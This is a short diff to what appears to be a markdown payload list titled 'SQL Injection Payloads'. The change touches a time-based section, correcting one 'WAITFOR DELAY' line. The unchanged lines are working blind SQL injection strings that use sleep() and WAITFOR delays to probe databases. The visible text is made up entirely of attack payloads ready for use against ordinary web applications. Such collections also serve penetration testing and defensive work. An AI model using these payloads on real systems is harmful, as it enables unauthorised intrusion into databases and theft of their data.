@@ -1,7 +1,7 @@
 # SQL Injection Payloads
 ## Time Based SQL Payloads
 ```sql
-10008 WAITFOR DELAY '0:0:5'
+WAITFOR DELAY '0:0:5'
 'XOR(if(now()=sysdate(),sleep(1*1),0))OR'
 ')orsleep(5)='
 1))orsleep(5)#
